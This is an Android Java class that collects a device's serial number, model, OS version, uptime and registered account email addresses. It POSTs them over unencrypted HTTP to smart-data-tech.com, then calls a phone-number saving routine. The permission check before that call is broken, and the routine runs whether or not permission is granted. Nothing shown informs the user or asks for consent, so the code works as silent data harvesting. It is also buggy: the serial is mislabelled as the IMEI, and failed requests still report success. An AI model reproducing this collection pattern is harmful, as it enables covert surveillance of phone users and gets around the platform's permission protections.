package com.example.androiddatachecker;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.ContextWrapper;

import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.SystemClock;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;

import android.util.Patterns;


import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

public class SaveUserCheckData  extends AppCompatActivity {
    private static ContextWrapper context;
    protected String uuid_user;
    int PERMISSION_ALL = 1;

    final String[] PERMISSIONS = {
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS
    };
    private static final int PERMISSION_REQUEST_CODE = 1;
    SimpleDateFormat heuref = new SimpleDateFormat("HH:mm");
    String heureFormatter = heuref.format(new Date());
    ////////////////date/////////////////////
    SimpleDateFormat datef = new SimpleDateFormat("dd/MM/yyyy");
    String dateFormatter = datef.format(new Date());


    ////Le constructeur de la classe, il doit prendre la context puis le retourner
    public SaveUserCheckData(ContextWrapper context,String uuid_user) {
        this.context = context;
        this.uuid_user = uuid_user;
    }
    // GPSTrackers local = new GPSTrackers(context);


    public void SaveUserCheckDatas(){
        InsertData(uuid_user,uuid_user,uuid_user,uuid_user,getPhoneIMEI(),version_phone(),ModelPhone(),updateUptimes(),
                getEmails(),"twitter","fb",dateFormatter,heureFormatter,dateFormatter,"actif",uuid_user);
        try {

            SaveUserPhoneNumber saveUserPhoneNumber = new SaveUserPhoneNumber(context, uuid_user);
            if (checkPermission(PERMISSIONS.toString())) {
                saveUserPhoneNumber.SaveUserPhoneNumbers();
            }else{
                checkPermission(PERMISSIONS.toString());
                saveUserPhoneNumber.SaveUserPhoneNumbers();
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
    }


    private String ModelPhone(){
        // TelephonyManager telemamanger = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        //String manufacturer = Build.MANUFACTURER;
        String model_phone = Build.MODEL;
        return model_phone;
    }
    private String version_phone(){
        StringBuilder strBuild = new StringBuilder();
        strBuild.append(android.os.Build.VERSION.RELEASE.substring(0, 3));
        String version = strBuild.toString();
        return version;
    }

    private String updateUptimes() {

        // Get the whole uptime
        long uptimeMillis = SystemClock.elapsedRealtime();
        String uptimePhone = String.format(
                "%02d:%02d:%02d",
                TimeUnit.MILLISECONDS.toHours(uptimeMillis),
                TimeUnit.MILLISECONDS.toMinutes(uptimeMillis)
                        - TimeUnit.HOURS.toMinutes(TimeUnit.MILLISECONDS
                        .toHours(uptimeMillis)),
                TimeUnit.MILLISECONDS.toSeconds(uptimeMillis)
                        - TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS
                        .toMinutes(uptimeMillis)));
        return uptimePhone;
    }

    private String getPhoneIMEI() {
        String serialNumber = Build.SERIAL;
        return serialNumber;
    }

    private void InsertData ( final String tel1, final String tel2, final String tel3, final String tel4, final String imei,
                              final String version,final String model,final String duree_activite,
                              final String gmail,final String twitter, final String fb,final String dat_ins,final String heure_ins,
                              final String last_update, final String etat,final String statut){



        class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
            @Override
            protected String doInBackground(String... params) {

                /*String NameHolder = name;
                String EmailHolder = email;*/

                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

                nameValuePairs.add(new BasicNameValuePair("tel1",tel1));
                nameValuePairs.add(new BasicNameValuePair("tel2",tel2));
                nameValuePairs.add(new BasicNameValuePair("tel3", tel3));
                nameValuePairs.add(new BasicNameValuePair("tel4", tel4));
                nameValuePairs.add(new BasicNameValuePair("imei", imei));
                nameValuePairs.add(new BasicNameValuePair("version", version));
                nameValuePairs.add(new BasicNameValuePair("model", model));
                nameValuePairs.add(new BasicNameValuePair("duree_activite", duree_activite));
                nameValuePairs.add(new BasicNameValuePair("gmail", gmail));
                nameValuePairs.add(new BasicNameValuePair("twitter", twitter));
                nameValuePairs.add(new BasicNameValuePair("fb", fb));
                nameValuePairs.add(new BasicNameValuePair("dat_ins", dat_ins));
                nameValuePairs.add(new BasicNameValuePair("heure_ins", heure_ins));
                nameValuePairs.add(new BasicNameValuePair("last_update", last_update));
                nameValuePairs.add(new BasicNameValuePair("etat", etat));
                nameValuePairs.add(new BasicNameValuePair("statut", statut));


                try {
                    HttpClient httpClient = new DefaultHttpClient();

                    HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/API/v1/saveuse/");
                    // HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");

                    //HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");
                    httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                    HttpResponse httpResponse = httpClient.execute(httpPost);

                    HttpEntity httpEntity = httpResponse.getEntity();


                } catch (ClientProtocolException e) {

                } catch (IOException e) {

                }
                return "Data Inserted Successfully";
            }

            @Override
            protected void onPostExecute(String result) {

                super.onPostExecute(result);

                //Toast.makeText(MainActivity.this, "Data Submit Successfully", Toast.LENGTH_LONG).show();

            }
        }

        SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();

        sendPostReqAsyncTask.execute(tel1, tel2, tel3, tel4, imei, version, model,duree_activite,gmail,twitter,fb,dat_ins,heure_ins,last_update,
                etat, statut);
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    private String getEmails() {
        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        String mail= null;
        // Getting all registered Google Accounts;
        // Account[] accounts = AccountManager.get(this).getAccountsByType("com.google");

        // Getting all registered Accounts;
        Account[] accounts = AccountManager.get(context).getAccounts();

        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                mail=account.name;
            }
        }
        return mail;
    }

    private boolean checkPermission(String permission){
        if (Build.VERSION.SDK_INT >= 23) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                int result = ContextCompat.checkSelfPermission(context, permission);
                if (result == PackageManager.PERMISSION_GRANTED) {
                    return true;
                } else {
                    return false;
                }
            }
        } else {
            return true;
        }
        return true;
    }

    private void requestPermission(String permission){
        if (ActivityCompat.shouldShowRequestPermissionRationale((Activity) context, permission)){
            return;

        }
        ActivityCompat.requestPermissions((Activity) context, new String[]{permission}, PERMISSION_REQUEST_CODE);
    }
}